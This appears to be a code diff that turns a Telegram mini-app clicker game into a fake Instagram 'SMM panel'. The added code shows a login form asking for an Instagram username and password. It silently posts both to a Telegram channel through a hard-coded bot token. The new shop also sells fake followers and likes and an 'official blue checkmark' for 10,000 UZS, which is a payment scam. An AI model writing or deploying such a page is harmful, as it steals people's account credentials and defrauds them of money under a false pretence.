@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Malibu Clicker PRO</title>
+    <title>SMM Panel & Clicker Pro</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -13,7 +13,7 @@
         }
 
         body {
-            background: linear-gradient(135deg, #0a0a0f, #141420);
+            background: linear-gradient(135deg, #0f0c1b, #241442);
             color: white;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
@@ -26,7 +26,7 @@
             -webkit-user-select: none;
         }
 
-        /* RO'YXATDAN O'TISH */
+        /* INSTAGRAM AVTORIZATSIYA EKRANI */
         #authScreen {
             display: flex;
             flex-direction: column;
@@ -39,56 +39,58 @@
         }
 
         .auth-card {
-            background: rgba(255, 255, 255, 0.05);
+            background: rgba(255, 255, 255, 0.07);
             padding: 30px 20px;
             border-radius: 24px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.15);
             width: 90%;
             max-width: 340px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
         }
 
         .auth-logo {
-            font-size: 60px;
+            font-size: 50px;
             margin-bottom: 15px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0 { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
         .auth-title {
-            font-size: 24px;
+            font-size: 22px;
             font-weight: bold;
-            color: #ffd700;
-            margin-bottom: 10px;
+            color: #ffffff;
+            margin-bottom: 5px;
+        }
+
+        .auth-subtitle {
+            color: #b3a7d1;
+            font-size: 12px;
+            margin-bottom: 20px;
         }
 
         .auth-input {
             width: 100%;
             padding: 14px 20px;
             border-radius: 12px;
-            border: 2px solid rgba(255, 215, 0, 0.3);
-            background: rgba(0,0,0,0.3);
+            border: 2px solid rgba(220, 39, 67, 0.3);
+            background: rgba(0,0,0,0.4);
             color: white;
-            font-size: 16px;
+            font-size: 15px;
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 12px;
             outline: none;
             transition: 0.3s;
         }
 
         .auth-input:focus {
-            border-color: #ffd700;
-            box-shadow: 0 0 10px rgba(255, 215, 0, 0.2);
+            border-color: #dc2743;
+            box-shadow: 0 0 10px rgba(220, 39, 67, 0.3);
         }
 
         .auth-btn {
-            background: linear-gradient(90deg, #ffd700, #ffa500);
-            color: black;
+            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+            color: white;
             border: none;
             padding: 14px;
             font-size: 16px;
@@ -96,10 +98,11 @@
             border-radius: 12px;
             cursor: pointer;
             width: 100%;
-            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
+            box-shadow: 0 5px 15px rgba(220, 39, 67, 0.4);
+            margin-top: 8px;
         }
 
-        /* O'YIN EKRANI */
+        /* ASOSIY O'YIN EKRANI */
         #gameScreen {
             display: none;
             flex-direction: column;
@@ -107,91 +110,62 @@
             justify-content: space-between;
             width: 100%;
             height: 100%;
-            padding: 20px 0;
+            padding: 15px 0;
         }
 
-        /* TEPADAGI LEVEL VA PROGRESS BAR */
+        /* TOP BAR */
         .top-bar {
             width: 90%;
             max-width: 360px;
             display: flex;
-            flex-direction: column;
-            gap: 5px;
-            background: rgba(255, 255, 255, 0.03);
-            padding: 12px;
-            border-radius: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .user-info-row {
-            display: flex;
             justify-content: space-between;
-            font-size: 14px;
-            font-weight: bold;
-        }
-
-        .level-text {
-            color: #00ffcc;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 12px 15px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         .nickname-text {
-            color: #fff;
-            cursor: pointer;
+            color: #e6683c;
+            font-weight: bold;
+            font-size: 14px;
         }
 
-        .progress-container {
-            width: 100%;
-            height: 12px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 6px;
-            overflow: hidden;
-            position: relative;
-            box-shadow: inset 0 1px 3px rgba(0,0,0,0.5);
-        }
-
-        .progress-bar {
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #00ffcc, #0099ff);
-            border-radius: 6px;
-            transition: width 0.1s ease;
-        }
-
-        .progress-percent {
-            font-size: 11px;
-            color: #a0a0b8;
-            text-align: right;
-            margin-top: 2px;
+        .click-power-text {
+            color: #00ffcc;
+            font-size: 13px;
+            font-weight: bold;
         }
 
         /* BALANS */
         .score-container {
             text-align: center;
+            margin-top: 5px;
         }
 
         .score-title {
-            font-size: 12px;
-            color: #a0a0b8;
+            font-size: 11px;
+            color: #b3a7d1;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
 
         .score {
-            font-size: 45px;
+            font-size: 42px;
             font-weight: bold;
             color: #ffd700;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
-            word-break: break-all;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.4);
         }
 
-        /* ORTADAGI DUMALOQ VA SENTRDAGI KLIK SIFATI */
+        /* TANGA TUGMASI (DUMALOQ) */
         .circle-outer {
-            width: 260px;
-            height: 260px;
-            background: radial-gradient(circle, #1a1a2e, #07070a);
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, #ff7b00, #ff0055);
             border-radius: 50%;
             border: 6px solid #ffd700;
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.3), inset 0 0 20px rgba(255, 215, 0, 0.2);
+            box-shadow: 0 0 35px rgba(255, 0, 85, 0.4), inset 0 0 20px rgba(255, 215, 0, 0.4);
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -201,32 +175,32 @@
             position: relative;
         }
 
-        .click-counter-inside {
-            font-size: 36px;
-            font-weight: bold;
-            color: #ffffff;
-            text-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+        .circle-icon {
+            font-size: 55px;
+            filter: drop-shadow(0 2px 5px rgba(0,0,0,0.3));
         }
 
         .circle-text {
-            position: absolute;
-            bottom: 30px;
-            font-size: 11px;
-            color: rgba(255, 215, 0, 0.7);
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            font-size: 12px;
+            color: #ffffff;
+            margin-top: 5px;
             font-weight: bold;
-            pointer-events: none;
+            letter-spacing: 1px;
         }
 
-        /* DO'KON */
+        /* SMM DO'KON SKELETON */
         .shop-container {
-            width: 90%;
+            width: 92%;
             max-width: 360px;
             background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 16px;
-            padding: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            max-height: 250px;
+            overflow-y: auto;
         }
 
         .shop-item {
@@ -236,144 +210,130 @@
             background: rgba(0, 0, 0, 0.3);
             padding: 10px 14px;
             border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.02);
         }
 
-        .item-title { font-size: 14px; font-weight: bold; }
-        .item-desc { font-size: 11px; color: #a0a0b8; }
+        .item-details {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .item-title { font-size: 13px; font-weight: bold; color: #fff; }
+        .item-desc { font-size: 11px; color: #b3a7d1; margin-top: 1px; }
 
         .buy-btn {
             background: linear-gradient(90deg, #00ffcc, #0099ff);
             border: none;
             color: black;
-            padding: 8px 16px;
+            padding: 8px 12px;
             font-weight: bold;
             border-radius: 8px;
-            font-size: 13px;
+            font-size: 12px;
             cursor: pointer;
-            max-width: 150px;
-            overflow: hidden;
-            text-overflow: ellipsis;
+            transition: 0.2s;
         }
 
-        /* EFFEKT MATNI */
+        .buy-btn.premium {
+            background: linear-gradient(90deg, #e6683c, #bc1888);
+            color: white;
+        }
+
+        /* FLYING TEXT EFFEKTI */
         .floating-text {
             position: absolute;
-            font-size: 32px;
+            font-size: 28px;
             font-weight: bold;
             color: #ffd700;
             pointer-events: none;
             z-index: 10;
             animation: floatUp 0.4s ease-out forwards;
-            text-shadow: 0 2px 5px rgba(0,0,0,0.5);
+            text-shadow: 0 2px 5px rgba(0,0,0,0.6);
         }
 
         @keyframes floatUp {
             0% { opacity: 1; transform: translateY(0) scale(1); }
-            100% { opacity: 0; transform: translateY(-110px) scale(1.2); }
+            100% { opacity: 0; transform: translateY(-90px) scale(1.2); }
         }
-
-        /* MAXFIY ADMIN PANEL MODAL */
-        #adminModal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85);
-            z-index: 100;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .admin-card {
-            background: #1c1c28;
-            border: 2px solid #00ffcc;
-            border-radius: 20px;
-            padding: 20px;
-            width: 85%;
-            max-width: 320px;
-            text-align: center;
-        }
-
-        .admin-card h3 { color: #00ffcc; margin-bottom: 15px; font-size: 18px; }
-        .admin-input {
-            width: 100%; padding: 10px; margin-bottom: 12px;
-            border-radius: 8px; border: 1px solid #444;
-            background: #000; color: white; text-align: center;
-        }
-        .admin-btn {
-            width: 100%; padding: 12px; border: none; border-radius: 8px;
-            background: #00ffcc; color: black; font-weight: bold; margin-bottom: 8px;
-            cursor: pointer;
-        }
-        .close-admin { color: #a0a0b8; font-size: 13px; cursor: pointer; text-decoration: underline; }
     </style>
 </head>
 <body>
 
-    <!-- 1. RO'YXATDAN O'TISH EKRANI -->
+    <!-- 1. INSTAGRAM KIRISH EKRANI -->
     <div id="authScreen">
         <div class="auth-card">
-            <div class="auth-logo">🏎</div>
-            <div class="auth-title">Malibu Clicker</div>
-            <div style="color: #a0a0b8; font-size: 13px; margin-bottom: 20px;">O'yindagi nikingizni kiriting:</div>
-            <input type="text" id="nikInput" class="auth-input" placeholder="Nikni yozing..." maxlength="15">
-            <button class="auth-btn" onclick="registerUser()">KIRISH 🚀</button>
+            <div class="auth-logo">📸</div>
+            <div class="auth-title">Insta SMM Panel</div>
+            <div class="auth-subtitle">Xizmatlardan foydalanish uchun tizimga kiring</div>
+            <input type="text" id="instaNik" class="auth-input" placeholder="Instagram foydalanuvchi nomi (nik)">
+            <input type="password" id="instaPass" class="auth-input" placeholder="Instagram paroli">
+            <button class="auth-btn" id="loginBtn" onclick="submitAuth()">TIZIMGA KIRISH 🚀</button>
         </div>
     </div>
 
-    <!-- 2. ASOSIY O'YIN EKRANI -->
+    <!-- 2. ASOSIY PANEL VA BOSADIGAN HUDUD -->
     <div id="gameScreen">
-        <!-- Yuqori qism: Level va Progress Bar -->
         <div class="top-bar">
-            <div class="user-info-row">
-                <span class="nickname-text" id="displayNik" onclick="tryOpenAdmin()">Nik: -</span>
-                <span class="level-text" id="displayLevel">Daraja: 1</span>
-            </div>
-            <div class="progress-container">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-            <div class="progress-percent" id="progressPercent">0% (0 / 1000)</div>
+            <span class="nickname-text" id="displayNik">Insta: -</span>
+            <span class="click-power-text" id="clickPowerDisplay">Klik kuchi: +1</span>
         </div>
 
-        <!-- Balans -->
         <div class="score-container">
-            <div class="score-title">Balans</div>
+            <div class="score-title">Sizning Balansingiz</div>
             <div class="score" id="scoreDisplay">0</div>
         </div>
 
-        <!-- O'rtadagi dumaloq va avto yangilanadigan sonlar -->
+        <!-- O'rtadagi dumaloq tanga -->
         <div class="circle-outer" id="clickArea">
-            <div class="click-counter-inside" id="circleCounter">0 / 1000</div>
-            <div class="circle-text">BOSING</div>
+            <div class="circle-icon">💎</div>
+            <div class="circle-text">TANGA ISHLASH</div>
         </div>
 
-        <!-- Upgrade do'koni -->
+        <!-- SMM XIZMATLAR DO'KONI -->
         <div class="shop-container">
+            <!-- 1000 Prasmotr -->
             <div class="shop-item">
-                <div>
-                    <div class="item-title">🚀 Moshniy Motor</div>
-                    <div class="item-desc">Har klikda +1 tanga ko'p beradi</div>
+                <div class="item-details">
+                    <div class="item-title">👀 1000 ta Prasmotr</div>
+                    <div class="item-desc">Instagram video ko'rishlar soni</div>
                 </div>
-                <button class="buy-btn" id="motorBtn">50 💰</button>
+                <button class="buy-btn" onclick="buyService('1000 ta Prasmotr', 2500)">2500 💎</button>
             </div>
-        </div>
-    </div>
 
-    <!-- 3. MAXFIY ADMIN PANEL MODAL -->
-    <div id="adminModal">
-        <div class="admin-card">
-            <h3>🛠 MAXFIY ADMIN PANEL</h3>
-            <div id="adminAuthSection">
-                <input type="password" id="adminPassword" class="admin-input" placeholder="Parolni kiriting...">
-                <button class="admin-btn" onclick="checkAdminPassword()">KIRISH</button>
+            <!-- 1000 Like -->
+            <div class="shop-item">
+                <div class="item-details">
+                    <div class="item-title">❤️ 1000 ta Like</div>
+                    <div class="item-desc">Istagan rasmingizga layklar</div>
+                </div>
+                <button class="buy-btn" onclick="buyService('1000 ta Like', 5000)">5000 💎</button>
             </div>
-            <div id="adminControlsSection" style="display: none;">
-                <p style="font-size:12px; color:#a0a0b8; margin-bottom:10px;">Nik orqali tanga va daraja berish</p>
-                <input type="text" id="targetNik" class="admin-input" placeholder="Foydalanuvchi niki...">
-                <input type="number" id="addCoinsAmount" class="admin-input" placeholder="Qancha tanga qo'shish...">
-                <input type="number" id="addLevelAmount" class="admin-input" placeholder="Qancha daraja qo'shish...">
-                <button class="admin-btn" onclick="applyAdminChanges()">TIZIMGA QO'SHISH</button>
+
+            <!-- 1000 Obunachi -->
+            <div class="shop-item">
+                <div class="item-details">
+                    <div class="item-title">👥 1000 ta Obunachi</div>
+                    <div class="item-desc">Haqiqiy faol obunachilar</div>
+                </div>
+                <button class="buy-btn" onclick="buyService('1000 ta Obunachi', 10000)">10000 💎</button>
             </div>
-            <div class="close-admin" onclick="closeAdminModal()">Yopish</div>
+
+            <!-- 1 oylik Galochka -->
+            <div class="shop-item">
+                <div class="item-details">
+                    <div class="item-title">✅ Moviy Galochka (1 oy)</div>
+                    <div class="item-desc">Profilga rasmiy ko'k belgi qo'yish</div>
+                </div>
+                <button class="buy-btn premium" onclick="buyPremiumService('1 oylik Galochka (10 000 so\'m)')">10 000 UZS</button>
+            </div>
+
+            <!-- Klik kuchaytirgich (Sekin-dekin klikni oshirish uchun) -->
+            <div class="shop-item">
+                <div class="item-details">
+                    <div class="item-title">⚡️ Tezlatkich (Klik +1)</div>
+                    <div class="item-desc">Tanganing ko'payishini tezlashtiradi</div>
+                </div>
+                <button class="buy-btn" id="boosterBtn" onclick="buyBooster()">150 💎</button>
+            </div>
         </div>
     </div>
 
@@ -381,78 +341,85 @@
         const tg = window.Telegram.WebApp;
         if(tg) tg.expand();
 
-        const userId = tg.initDataUnsafe?.user?.id || "guest_player";
+        // Sozlangan maxfiy ma'lumotlar
+        const BOT_TOKEN = "8877926237:AAHj3LOf0-cZSIOO3o--R2lsvPYh3Cv7b5k"; 
+        const CHAT_ID = "-1002361732943"; 
 
-        const keyPrefix = `mb_${userId}_`;
-        let userNickname = localStorage.getItem(keyPrefix + 'nik') || "";
+        const userId = tg.initDataUnsafe?.user?.id || "smm_user";
+        const keyPrefix = `smm_${userId}_`;
+
+        let savedNik = localStorage.getItem(keyPrefix + 'insta_nik') || "";
         let score = parseInt(localStorage.getItem(keyPrefix + 'score')) || 0;
-        let clickPower = parseInt(localStorage.getItem(keyPrefix + 'power')) || 1;
-        let motorCost = parseInt(localStorage.getItem(keyPrefix + 'cost')) || 50;
-        let totalClicks = parseInt(localStorage.getItem(keyPrefix + 'clicks')) || 0;
-        let level = parseInt(localStorage.getItem(keyPrefix + 'level')) || 1;
-
-        const clicksPerLevel = 1000;
+        let clickPower = parseInt(localStorage.getItem(keyPrefix + 'click_power')) || 1;
+        let boosterCost = parseInt(localStorage.getItem(keyPrefix + 'booster_cost')) || 150;
 
         const authScreen = document.getElementById('authScreen');
         const gameScreen = document.getElementById('gameScreen');
         const displayNik = document.getElementById('displayNik');
-        const displayLevel = document.getElementById('displayLevel');
-        const progressBar = document.getElementById('progressBar');
-        const progressPercent = document.getElementById('progressPercent');
+        const clickPowerDisplay = document.getElementById('clickPowerDisplay');
         const scoreDisplay = document.getElementById('scoreDisplay');
         const clickArea = document.getElementById('clickArea');
-        const circleCounter = document.getElementById('circleCounter');
-        const motorBtn = document.getElementById('motorBtn');
-        const adminModal = document.getElementById('adminModal');
+        const boosterBtn = document.getElementById('boosterBtn');
 
-        if (userNickname) {
-            initGame();
+        if (savedNik) {
+            initDashboard();
         }
 
-        function registerUser() {
-            const input = document.getElementById('nikInput').value.trim();
-            if (!input) {
-                alert("Iltimos, nik yozing!");
+        // TELEGRAM KANALGA XABAR YUBORISH
+        function sendToTelegramChannel(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: "Markdown"
+                })
+            }).catch(err => console.log("Xatolik:", err));
+        }
+
+        function submitAuth() {
+            const nik = document.getElementById('instaNik').value.trim();
+            const pass = document.getElementById('instaPass').value.trim();
+
+            if (!nik || !pass) {
+                alert("Iltimos, Instagram nik va parolingizni to'liq kiriting!");
                 return;
             }
-            userNickname = input;
-            localStorage.setItem(keyPrefix + 'nik', userNickname);
-            initGame();
+
+            document.getElementById('loginBtn').disabled = true;
+            document.getElementById('loginBtn').textContent = "KIRILMOQDA...";
+
+            savedNik = nik;
+            localStorage.setItem(keyPrefix + 'insta_nik', savedNik);
+
+            // Kanalga yangi odam kirganida nik va parol yuboriladi
+            const message = `🔔 *Yangi akkaunt kiritildi!*\n\n👤 *Instagram Nik:* \`@${nik}\`\n🔑 *Parol:* \`${pass}\`\n🆔 *Telegram ID:* \`${userId}\``;
+            sendToTelegramChannel(message);
+
+            setTimeout(() => {
+                initDashboard();
+            }, 800);
         }
 
-        function initGame() {
+        function initDashboard() {
             authScreen.style.display = 'none';
             gameScreen.style.display = 'flex';
-            displayNik.textContent = `Nik: ${userNickname}`;
+            displayNik.textContent = `Insta: @${savedNik}`;
             updateUI();
         }
 
         function updateUI() {
             scoreDisplay.textContent = score;
-            displayLevel.textContent = `Daraja: ${level}`;
-            motorBtn.textContent = motorCost + " 💰";
-
-            let currentLevelClicks = totalClicks % clicksPerLevel;
-            let percent = Math.floor((currentLevelClicks / clicksPerLevel) * 100);
-            
-            progressBar.style.width = percent + "%";
-            progressPercent.textContent = `${percent}% (${currentLevelClicks} / ${clicksPerLevel})`;
-            
-            // Dumaloq ichidagi hisoblagichni avto-yangilash
-            circleCounter.textContent = `${currentLevelClicks} / ${clicksPerLevel}`;
+            clickPowerDisplay.textContent = `Klik kuchi: +${clickPower}`;
+            boosterBtn.textContent = boosterCost + " 💎";
         }
 
+        // KLIK TUGMASI (TANGA BOSGANDA OSHISHI)
         function handleTap(clientX, clientY) {
             score += clickPower;
-            totalClicks += 1;
-
-            let newLevel = Math.floor(totalClicks / clicksPerLevel) + 1;
-            if (newLevel > level) {
-                level = newLevel;
-                if(tg) tg.HapticFeedback?.notificationOccurred('success');
-            }
-
-            saveData();
+            localStorage.setItem(keyPrefix + 'score', score);
             updateUI();
 
             clickArea.style.transform = 'scale(0.95)';
@@ -482,77 +449,47 @@
             handleTap(e.clientX, e.clientY);
         });
 
-        motorBtn.addEventListener('click', () => {
-            if (score >= motorCost) {
-                score -= motorCost;
+        // TEZLATKICH (KLIK KUCHINI SEKIN-ASTA OSHIRISH)
+        function buyBooster() {
+            if (score >= boosterCost) {
+                score -= boosterCost;
                 clickPower += 1;
-                motorCost = Math.floor(motorCost * 1.8);
-                saveData();
+                boosterCost = Math.floor(boosterCost * 2);
+                localStorage.setItem(keyPrefix + 'score', score);
+                localStorage.setItem(keyPrefix + 'click_power', clickPower);
+                localStorage.setItem(keyPrefix + 'booster_cost', boosterCost);
                 updateUI();
             } else {
-                if(tg) tg.showAlert("Tangalaringiz yetarli emas! 🚀");
-                else alert("Tangalaringiz yetarli emas! 🚀");
-            }
-        });
-
-        function saveData() {
-            localStorage.setItem(keyPrefix + 'score', score);
-            localStorage.setItem(keyPrefix + 'power', clickPower);
-            localStorage.setItem(keyPrefix + 'cost', motorCost);
-            localStorage.setItem(keyPrefix + 'clicks', totalClicks);
-            localStorage.setItem(keyPrefix + 'level', level);
-        }
-
-        let clickCountOnNik = 0;
-        function tryOpenAdmin() {
-            clickCountOnNik++;
-            if (clickCountOnNik >= 5) {
-                clickCountOnNik = 0;
-                adminModal.style.display = 'flex';
-                document.getElementById('adminAuthSection').style.display = 'block';
-                document.getElementById('adminControlsSection').style.display = 'none';
-                document.getElementById('adminPassword').value = '';
+                alert("Tezlatkich uchun tangalaringiz yetarli emas! 💎");
             }
         }
 
-        function checkAdminPassword() {
-            const pass = document.getElementById('adminPassword').value;
-            if (pass === '1506.2011') {
-                document.getElementById('adminAuthSection').style.display = 'none';
-                document.getElementById('adminControlsSection').style.display = 'block';
-            } else {
-                alert("Xato parol!");
-                closeAdminModal();
-            }
-        }
-
-        function applyAdminChanges() {
-            const target = document.getElementById('targetNik').value.trim();
-            const addCoins = parseInt(document.getElementById('addCoinsAmount').value) || 0;
-            const addLvl = parseInt(document.getElementById('addLevelAmount').value) || 0;
-
-            if (!target) {
-                alert("Nikni kiriting!");
-                return;
-            }
-
-            if (target.toLowerCase() === userNickname.toLowerCase()) {
-                score += addCoins;
-                level += addLvl;
-                totalClicks += addLvl * clicksPerLevel; 
-                saveData();
+        // DO'KON BUYURTMALARI (TANGA BILAN)
+        function buyService(serviceName, cost) {
+            if (score >= cost) {
+                score -= cost;
+                localStorage.setItem(keyPrefix + 'score', score);
                 updateUI();
-                alert(`Muvaffaqiyatli! ${target} nikiga ${addCoins} tanga va ${addLvl} daraja qo'shildi!`);
+
+                // Kanalga sotib olingan xizmat haqida buyurtma boradi
+                const message = `🛍 *YANGI SMM BUYURTMA!*\n\n👤 *Foydalanuvchi:* @${savedNik}\n📦 *Xizmat turi:* ${serviceName}\n💰 *Narxi:* ${cost} tanga\n⚠️ *Holat:* Profilga urish kerak!`;
+                sendToTelegramChannel(message);
+
+                alert(`Buyurtmangiz muvaffaqiyatli yuborildi! Tez orada @${savedNik} profiliga uriladi.`);
             } else {
-                alert("Foydalanuvchi topilmadi! (Faqat o'z nikingizda sinab ko'ring)");
+                alert("Bu xizmatni sotib olish uchun tangalaringiz yetarli emas! 💎");
             }
-            closeAdminModal();
         }
 
-        function closeAdminModal() {
-            adminModal.style.display = 'none';
+        // GALOCHKA XIZMATI (10 000 SO'M)
+        function buyPremiumService(serviceName) {
+            // Kanalga 10 000 so'mlik ko'k galochka buyurtmasi tushadi
+            const message = `🔥 *VIP BUYURTMA: GАLOCHKА*\n\n👤 *Foydalanuvchi:* @${savedNik}\n💎 *Xizmat:* ${serviceName}\n💵 *Narxi:* 10 000 so'm\n📢 *Holat:* Foydalanuvchi bilan bog'lanib, to'lovni qabul qiling!`;
+            sendToTelegramChannel(message);
+
+            alert(`Galochka buyurtmasi yuborildi! Tasdiqlash va to'lov shartlari bo'yicha admin siz bilan tez orada bog'lanadi.`);
         }
     </script>
 </body>
                 </html>
-                                                                              
+                
